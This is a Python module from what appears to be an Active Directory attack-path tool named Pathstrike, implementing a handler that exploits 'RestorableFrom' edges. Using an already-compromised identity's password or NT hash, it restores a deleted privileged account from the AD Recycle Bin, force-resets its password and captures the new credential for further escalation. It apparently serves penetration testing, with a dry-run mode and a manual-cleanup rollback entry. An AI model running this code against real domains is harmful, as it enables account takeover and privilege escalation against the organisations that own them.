"""Handler for the synthetic ``RestorableFrom`` edge type.

Phase 3C of Option A (live-enum).  Pathstrike's campaign orchestrator
enumerates tombstoned ("deleted") user objects in AD whenever a newly-
owned identity has LDAP access, and — when one of those deleted accounts
looks privileged — records a ``RestorableFrom`` edge in the live
:class:`~pathstrike.engine.capability_graph.CapabilityGraph`:

    <owned_principal>  --RestorableFrom-->  <deleted_account>

This handler exploits that edge: it reanimates the tombstoned account
(MODIFYDN out of ``CN=Deleted Objects`` → original OU, drop
``isDeleted`` attribute), then force-sets a fresh random password via
the Microsoft LDAP ``modifyPassword`` extended operation.  The new
credential is captured into the credential store so subsequent steps
can authenticate as the restored account — typically revealing ADCS
enrollment rights or group memberships that previously-owned identities
lacked.

Rollback of a restoration is non-trivial (deleting the object a second
time would tombstone it again but not restore the prior state), so the
handler records a best-effort informational rollback entry rather than
a reversible one.
"""

from __future__ import annotations

import secrets
import string

from pathstrike.config import PathStrikeConfig
from pathstrike.engine.credential_store import CredentialStore
from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools.live_enum import (
    build_ntlm_connection,
    ldap3_available,
    restore_deleted_object,
    set_user_password,
)


def _generate_password(length: int = 20) -> str:
    """Cryptographically random password complying with default AD policy."""
    alphabet = string.ascii_letters + string.digits + "!@#$%&*"
    return "".join(secrets.choice(alphabet) for _ in range(length))


@register_handler("RestorableFrom")
class RestoreDeletedObjectHandler(BaseEdgeHandler):
    """Restore a tombstoned account and reset its password.

    Expected edge metadata (supplied by the live-enum stage via
    :class:`CapabilityEdge.properties`):

        ``deleted_dn``        — full tombstoned distinguishedName
        ``last_known_parent`` — DN of the original containing OU
        ``sam_account_name``  — original sAMAccountName (or CN, fallback)

    Without these properties the handler can't act — we return a
    prerequisite failure so the campaign skips the path cleanly.
    """

    def __init__(
        self, config: PathStrikeConfig, credential_store: CredentialStore,
    ) -> None:
        super().__init__(config, credential_store)
        self._restored_dn: str | None = None
        self._restored_password: str | None = None

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if not ldap3_available():
            return (
                False,
                "ldap3 not importable — install the `ldap3` Python package "
                "to restore deleted AD objects",
            )

        props = edge.properties or {}
        missing = [
            k for k in ("deleted_dn", "last_known_parent", "sam_account_name")
            if not props.get(k)
        ]
        if missing:
            return (
                False,
                f"Missing edge properties: {', '.join(missing)} "
                f"(edge was not produced by live-enum)",
            )
        return True, f"Ready to restore {props['sam_account_name']}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False,
    ) -> tuple[bool, str, list[Credential]]:
        props = edge.properties or {}
        deleted_dn = props["deleted_dn"]
        last_known_parent = props["last_known_parent"]
        sam = props["sam_account_name"]
        domain = self._get_domain()

        if dry_run:
            return (
                True,
                (
                    f"[DRY RUN] Would restore '{sam}' from "
                    f"{deleted_dn} to {last_known_parent} and reset password"
                ),
                [],
            )

        # Build an LDAP connection as the source principal (who holds the
        # Reanimate-Tombstone + write rights that make this exploit possible).
        source_principal = self._resolve_principal(edge)
        cred = self.cred_store.get_best_credential(source_principal, domain)
        if cred is None:
            return (
                False,
                f"No credential available for {source_principal} — "
                f"cannot bind LDAP for restore",
                [],
            )

        password: str | None = None
        nt_hash: str | None = None
        if cred.cred_type == CredentialType.password:
            password = cred.value
        elif cred.cred_type == CredentialType.nt_hash:
            nt_hash = cred.value
        else:
            return (
                False,
                f"Restore requires password or NT hash for {source_principal}; "
                f"got {cred.cred_type.value}",
                [],
            )

        dc_host = self.config.domain.dc_fqdn or self.config.domain.dc_host
        conn = build_ntlm_connection(
            dc_host=dc_host,
            domain=domain,
            username=source_principal,
            password=password,
            nt_hash=nt_hash,
        )
        if conn is None:
            return (
                False,
                f"Could not bind LDAP to {dc_host} as {source_principal}",
                [],
            )

        try:
            # Step 1: reanimate the tombstone
            self.logger.info(
                "Restoring tombstoned object '%s' to '%s'",
                sam, last_known_parent,
            )
            ok, msg, restored_dn = restore_deleted_object(
                conn, deleted_dn, sam, last_known_parent,
            )
            if not ok:
                return False, f"Restore failed: {msg}", []
            self._restored_dn = restored_dn

            # Step 2: force-set a known password
            new_pass = _generate_password()
            self.logger.info("Setting new password for restored account '%s'", sam)
            ok, pw_msg = set_user_password(conn, restored_dn, new_pass)
            if not ok:
                return (
                    False,
                    (
                        f"Restored {sam} to {restored_dn} but password reset "
                        f"failed: {pw_msg}.  Account is live but you'll need "
                        f"to reset the password manually."
                    ),
                    [],
                )
            self._restored_password = new_pass

            # Capture the credential so subsequent campaign rounds can
            # authenticate as the restored identity.
            captured = Credential(
                cred_type=CredentialType.password,
                value=new_pass,
                username=sam,
                domain=domain,
                obtained_from=f"Restored from Deleted Objects by {source_principal}",
            )
            return (
                True,
                f"Restored '{sam}' and set new password — credential captured",
                [captured],
            )
        finally:
            try:
                conn.unbind()
            except Exception:  # pragma: no cover
                pass

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        """Record an informational rollback — restoring a tombstone isn't reversible.

        We could re-delete the object, but it wouldn't recreate the prior
        tombstone state (attribute contents, OU, etc.) and would be a
        destructive no-op in most cases.  Flag as non-reversible so the
        operator knows to clean up manually if the engagement requires it.
        """
        props = edge.properties or {}
        sam = props.get("sam_account_name", "<unknown>")
        restored_dn = self._restored_dn or props.get("last_known_parent", "<unknown>")
        return RollbackAction(
            step_index=0,
            action_type="manual_cleanup_required",
            description=(
                f"Restored '{sam}' from AD Recycle Bin and reset password — "
                f"cannot auto-revert.  Manual cleanup: re-delete the account "
                f"or restore its original password hash if preserved."
            ),
            command=f"# manual: remove or re-disable user {sam} at {restored_dn}",
            reversible=False,
        )
